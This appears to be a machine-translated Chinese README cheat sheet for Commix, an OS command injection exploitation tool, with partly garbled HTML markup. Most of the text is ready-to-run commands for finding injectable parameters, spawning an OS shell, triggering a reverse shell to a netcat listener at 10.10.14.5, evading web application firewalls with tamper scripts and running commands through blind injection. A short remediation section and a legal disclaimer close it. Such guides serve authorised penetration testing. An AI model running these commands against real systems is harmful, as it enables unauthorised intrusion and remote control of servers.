<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💉 Commix - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="网络安全">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="许可证 GPLv3">
</p>

<p对齐=“中心”>
  <b>🌐自动化工具，旨在检测和利用 Web 应用程序中的命令注入漏洞并生成交互式 shell</b>
</p>

---

## 📋 目录

- [概述和命令注入原语](#-overview--the-command-injection-primitive)
- [安装](#-安装)
- [基础漏洞扫描](#-basic-vulnerability-scanning)
- [注入不同的 HTTP 元素](#-injecting- different-http-elements)
  - [获取参数](#get-parameters)
  - [发布数据(`--data`)](#post-data---数据)
  - [HTTP 标头和 Cookie](#http-headers--cookies)
- [生成交互式和反向外壳](#-spawning-interactive--reverse-shells)
  - [伪 Shell (`--os-shell`)](#pseudo-shell---os-shell)
  - [本机反向 Shell (`--reverse-ip`)](#native-reverse-shell---reverse-ip)
- [WAF 规避和篡改脚本 (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
- [基于文件和基于时间的盲法](#-file-based--time-based-blind-techniques)
- [快速参考表](#-quick-reference-table)
- [防御考虑与补救](#-defective-considerations--remediation)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和命令注入原语

虽然 **SQLMap** 自动执行 SQL 注入，但 **Commix**（由 **Anastasios Stasinopoulos** 创建）是查找和利用 **OS 命令注入** 缺陷的黄金标准。

当 Web 应用程序不安全地将用户输入直接传递给操作系统执行函数（`system()`、`exec()`、`passthru()`、`Runtime.getRuntime().exec()`）时，攻击者可以附加任意 shell 命令。 Commix 自动检测基于结果、基于输出、基于时间的盲注和基于文件的注入向量。

---

## 📥 安装
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```
---

## 🚀 基本漏洞扫描
```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```
---

## 🔍 注入不同的 HTTP 元素

### 获取参数
如果存在多个参数，请使用 `INJECT_HERE` 标签：
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```
### 发布数据 (`--data`)
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```
### HTTP 标头和 Cookie
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```
---

## 💀 生成交互式和反向 Shell

### 伪 Shell (`--os-shell`)

确认注入后，Commix 会直接在控制台内提供一个模拟伪终端：
```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```
### 本机反向 Shell (`--reverse-ip`)

指示 Commix 将完整的交互式反向 TCP 连接断开回 Netcat 侦听器：
```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```
---

## 🥷 WAF 规避和篡改脚本 (`--tamper`)

使用内置混淆篡改绕过 Web 应用程序防火墙 (WAF) 和字符串黑名单：
```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```
---

## ⏱️ 基于文件和基于时间的盲法技术

当输出未呈现回 HTTP 响应时：
```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **扫描GET参数** | `commix -u "<URL>?param=val"` |
| **扫描 POST 参数** | `commix -u "<URL>" --data="param=val"` |
| **批量非交互式扫描** | `commix -u "<URL>" --batch` |
| **交互式终端外壳**| `commix -u "<URL>" --os-shell` |
| **删除反向外壳** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **重播 Burp 请求** | `commix -r burp_request.req` |
| **使用空间篡改** | `commix -u "<URL>" --tamper=space2ifs` |
| **执行单个命令** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ 防御注意事项和补救措施

1. **避免操作系统 Shell 执行：** 切勿将未经处理的用户输入连接到 `system()`、`exec()` 或 shell 命令中。
2. **使用本机语言 API：** 用本机编程语言库替换系统实用程序（例如，使用 Python 的 `socket` 库而不是执行系统 ​​`ping` 二进制文件）。
3. **严格白名单：** 如果用户输入必须指示程序执行，请在调用之前根据严格的字母数字白名单验证输入。

---

## ⚠️ 法律免责声明

> [!警告]
> Commix 在目标服务器上自动执行任意命令。模糊测试或利用未经授权的网络应用程序是非法的。仅在您拥有明确书面授权的系统上使用。